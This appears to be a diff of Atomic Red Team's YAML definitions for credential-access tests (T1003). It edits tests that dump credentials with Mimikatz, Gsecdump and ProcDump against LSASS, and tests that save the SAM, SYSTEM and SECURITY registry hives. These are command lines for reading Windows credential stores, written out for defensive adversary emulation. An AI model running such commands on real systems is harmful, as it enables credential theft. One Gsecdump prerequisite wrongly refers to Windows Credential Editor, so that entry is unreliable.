@@ -19625,8 +19625,8 @@ credential-access:
       identifier: T1003
     atomic_tests:
     - name: Powershell Mimikatz
-      description: 'Dumps Credentials via Powershell by invoking a remote mimikatz
-        script
+      description: 'Dumps credentials from memory via Powershell by invoking a remote
+        mimikatz script
 
         '
       supported_platforms:
@@ -19644,17 +19644,26 @@ credential-access:
 
           '
     - name: Gsecdump
-      description: 'https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
+      description: 'Dump credentials from memory using Gsecdump
 
         '
       supported_platforms:
       - windows
+      input_arguments:
+        gsecdump_exe:
+          description: Path to the Gsecdump executable
+          type: Path
+          default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Windows Credential Editor must exist on disk at specified location
+          (#{wce_exe})
+        prereq_command: 'if (Test-Path #{gsecdump_exe}) {0} else {1}'
+        get_prereq_command: Write-Host Automated installer not implemented yet
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'gsecdump -a
-
-          '
+        command: "#{gsecdump_exe} -a\n"
     - name: Windows Credential Editor
       description: 'http://www.ampliasecurity.com/research/windows-credentials-editor/
 
@@ -19709,13 +19718,13 @@ credential-access:
         name: command_prompt
         elevation_required: true
         command: |
-          reg save HKLM\sam "#{output_folder}\sam"
-          reg save HKLM\system "#{output_folder}\system"
-          reg save HKLM\security "#{output_folder}\security"
+          reg save HKLM\sam %temp%\sam
+          reg save HKLM\system %temp%\system
+          reg save HKLM\security %temp%\security
         cleanup_command: |
-          del "#{output_folder}\sam"       >nul 2> nul
-          del "#{output_folder}\system"    >nul 2> nul
-          del "#{output_folder}\security"  >nul 2> nul
+          rm %temp%\sam
+          rm %temp%\system
+          rm %temp%\security
     - name: Dump LSASS.exe Memory using ProcDump
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
@@ -19804,7 +19813,13 @@ credential-access:
         output_folder:
           description: Path where resulting dump should be placed
           type: Path
-          default: C:\Windows\Temp
+          default: C:\Atomic_Red_Team
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
       executor:
         name: command_prompt
         elevation_required: true
@@ -19823,6 +19838,12 @@ credential-access:
           description: Drive letter to source VSC (including colon)
           type: String
           default: 'C:'
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
       executor:
         name: command_prompt
         elevation_required: true
